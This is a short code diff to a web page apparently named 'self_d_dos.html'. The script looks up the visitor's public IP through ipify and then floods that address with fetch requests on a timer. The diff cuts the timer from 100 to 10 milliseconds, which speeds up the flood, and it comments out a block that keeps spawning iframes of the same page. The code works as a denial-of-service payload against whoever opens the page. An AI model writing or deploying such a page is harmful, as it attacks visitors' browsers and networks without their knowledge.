@@ -11,17 +11,17 @@ fetch("https://api.ipify.org/?format=jsonp&callback=")
   console.log(j)
 setInterval(()=>{
 fetch("https://"+j.ip)
-},100)
+},10)
 })
 
 //Multiply iframes
-  
+  /*
 setInterval(()=>{
 let i = document.createElement("iframe")
 i.src="self_d_dos.html"
 document.body.appendChild(i)
 },1000)
-
+*/
 </script>
 </body>
 </html>
